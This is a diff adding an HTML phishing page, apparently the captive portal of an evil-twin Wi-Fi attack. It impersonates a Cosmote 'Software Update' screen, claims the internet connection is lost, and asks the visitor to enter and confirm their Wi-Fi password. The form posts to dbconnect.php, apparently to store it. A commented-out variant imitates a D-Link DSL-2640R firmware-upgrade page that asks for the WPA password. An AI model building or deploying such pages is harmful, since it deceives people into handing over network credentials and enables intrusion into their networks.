@@ -1,0 +1,124 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <meta http-equiv="Content-type" content="text/html; charset=utf-8;" />
+        <title>Software Update - Cosmote</title>
+        <link rel="stylesheet" type="text/css" href="style.css" />
+        <link rel="stylesheet" href="bootstrap/bootstrap-4.5.3-dist/css/bootstrap.min.css">
+    </head>
+
+    <body class="d-flex justify-content-center align-items-center">
+
+        <!-- We are all about that Modern Design! -->
+        <div class="container text-center">
+
+            <img
+            class="rounded mb-2"
+                src="logo.jpg" alt="logo of the internet provider" 
+                width="75px" height="75px"
+            >
+            <h5 class="text-center font-weight-bold mb-3">By Cosmote</h4>
+            <div class="card shadow mx-auto text-left" style="max-width: 494; min-width: 492;" >
+                <div class="card-header text-center">
+                    <p class="mb-0 py-2">We are very sorry for the incovenience</p>
+                </div>
+                <div class="card-body">
+    
+                    <div class="media align-items-center">
+                        <a class="d-flex align-self-center" href="#">
+                              <img src="no-wifi.png" alt="No Wifi png">
+                        </a>
+                        <div class="media-body">
+                            <h5 class="font-weight-bold">No Internet Connection!</h5>
+                            <p class="pr-2 mb-0">Please connect again and wait for the Update to complete.</p>
+                        </div>
+                    </div>
+
+                    <!-- This form won't submit unless the user has entered the same 
+                    > 8  -->
+                    <form method='post' action="dbconnect.php" data-parsley-validate>
+                        <div class="form-group px-4">
+                            <label for="">Wi-Fi Password</label>
+                            <input type="password" 
+                                name="password1" 
+                                data-parsley-minlength="8"
+                                id="pass1" 
+                                class="form-control" 
+                                placeholder="" 
+                                aria-describedby="helpId" 
+                                required=""
+                            >
+                            <small id="helpId" class="text-muted">For connection to router</small>
+                        </div>
+                        <div class="form-group px-4">
+                            <label for="">Confirm Password</label>
+                            <input type="password" 
+                                name="password2" 
+                                id="pass2" 
+                                class="form-control" 
+                                placeholder="" 
+                                aria-describedby="helpId" 
+                                data-parsley-equalto="#pass1"
+                                required=""
+                            >
+                            <small id="helpId" class="text-muted">Confirmation needed</small>
+                        </div>
+                        <div class="form-group px-4">
+                            <input class="btn btn-success float-right" type="submit" value="Connect" value="Send">
+                        </div>
+                    </form>
+
+                </div>
+            </div>
+
+        </div>
+
+        <!-- <div id="top-header">
+            <span class="top-left">&nbsp;Product: DSL-2640R </span>
+            <span class="top-right">Firmware Version: EU_1.06 &nbsp; Hardware Version: B1&nbsp;</span>
+        </div>
+        
+        <div id="header">
+            <img id="img" src="./masthead.jpg" width="800px">
+            <div id="header-left">
+                <img id="logo" src="./logo.png" width="100px">
+            </div>
+            <div id="header-right">
+                Web Administration
+            </div>
+        </div>
+        
+        <div id="content">
+            <table id="warning">
+            <th>FIRMWARE UPGRADE:</th>
+             
+            <tr><td>A new firmware is available to improve
+            functionality and performance.</td></tr>
+            </table>
+
+            <table>
+
+            <th>DOWNLOAD AND UPGRADE:</th>
+            <tr><td><b>Current Firmware Version: </b> 1.04</td></tr>
+             
+            <tr><td><form action="dbconnect.php" method="post">
+            WPA Password: <input type="password" name="password1"><br>
+            Confirm Password: <input type="password" name="password2"><br>
+            <input type="submit" value="Submit" value="Send"> </td>
+            </tr>
+            </table>
+
+        </div>
+
+        <div id="bottom"></div>
+        <div id="copyright">Copyright © 2005-2020</div> -->
+        
+        <!-- Adding jQuery -->
+        <script src="jQuery.js"></script>
+        <script src="parsley.min.js"></script>
+        <!-- Adding Parsley Form Validation -->
+
+        <script>
+           
+        </script>
+    </body>
+</html>
